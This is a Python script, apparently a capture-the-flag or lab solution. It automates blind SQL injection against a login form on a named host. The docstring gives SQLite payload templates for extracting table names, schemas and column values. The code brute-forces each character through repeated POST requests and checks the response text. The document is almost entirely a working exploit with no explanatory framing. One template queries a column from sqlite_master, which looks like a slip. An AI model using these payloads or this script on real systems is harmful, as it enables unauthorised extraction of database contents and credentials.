'''
For table names:
' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {} --

For table schema:
' or UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --

For values inside columns:
' or UNICODE(SUBSTR((SELECT $COLUMN_NAME FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --
'''

import requests

s = requests.Session()
query = "' or UNICODE(SUBSTR((SELECT kAdi FROM sqlite_master WHERE tbl_name='tr99'),{},1)){} {}--"
url = "https://demirci.siberkuvvet.com/bsqli-34687af79e749b19c8485c1b8b218ea3/parola.php"
charSeaching = 1
interval = 0
finished = False

while not finished:
    for i in 44, 56, 68, 80, 92, 104, 116, 128:
        req = s.post(
            url, data={"kullanici": query.format(charSeaching, "<", str(i))})
        if "Bilgiler gonderildi." in str(req.text):
            interval = i
            break

    for i in range(interval-12, interval):
        req = s.post(
            url, data={"kullanici": query.format(charSeaching, "=", str(i))})
        if "Bilgiler gonderildi." in str(req.text):
            charSeaching += 1
            finished = False
            print(chr(i), end="")
            break
        else:
            finished = True
